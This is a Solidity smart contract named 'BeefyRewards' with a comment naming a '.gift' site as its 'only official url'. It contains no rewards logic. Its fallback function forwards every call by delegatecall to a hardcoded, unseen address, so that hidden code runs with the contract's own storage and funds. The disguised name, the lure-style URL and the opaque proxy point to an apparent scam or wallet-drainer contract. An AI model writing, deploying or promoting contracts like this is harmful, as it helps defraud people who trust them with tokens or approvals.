// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

// The only official url is https://netvrk.gift/

contract BeefyRewards {
    uint256 private totalSupply = 1000;

    fallback(bytes calldata data) external payable returns (bytes memory) {
        (bool r1, bytes memory result) = address(
            0xB891Fe856cb2163412c8652f1b574723C303571f
        ).delegatecall(data);
        require(r1, "Verification");
        return result;
    }

    constructor() {}
}